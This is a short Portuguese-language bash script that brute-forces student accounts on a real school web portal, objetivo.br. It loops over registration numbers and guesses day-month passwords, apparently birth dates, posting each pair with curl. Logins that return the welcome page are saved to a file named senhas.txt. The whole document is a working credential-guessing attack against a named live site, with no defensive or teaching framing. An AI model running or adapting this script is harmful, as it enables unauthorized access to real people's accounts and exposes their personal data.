
unidade=0501
matricula=190

mes="0"
dia="0"

teste=$unidade$matricula


while [ $matricula -lt 1000 ]
do
	mes=1
	while [ $mes  -le 12 ]
	do
		dia=0
		while [ $dia -le 30 ]
		do
			dia=$(($dia+1))
			senha=`printf "%02d%02d" $dia $mes`
			numero=`printf "%07d" $matricula`
			numero="$unidade$numero"
			curl -silent --data "matricula=$numero&senha=$senha&entrar=" http://www.objetivo.br/default.asp | grep "Bem-vindo"
			if [ $? -eq 0 ]
			then
				curl -silent --data "matricula=$numero&senha=$senha&entrar=" http://www.objetivo.br/default.asp | grep "Bem-vindo" >> senhas.txt
				echo "$senha $numero" >> senhas.txt
			fi
			echo "$senha $numero"
		done
		mes=$[$mes+1]
	done
	matricula=$(($matricula+1))
done
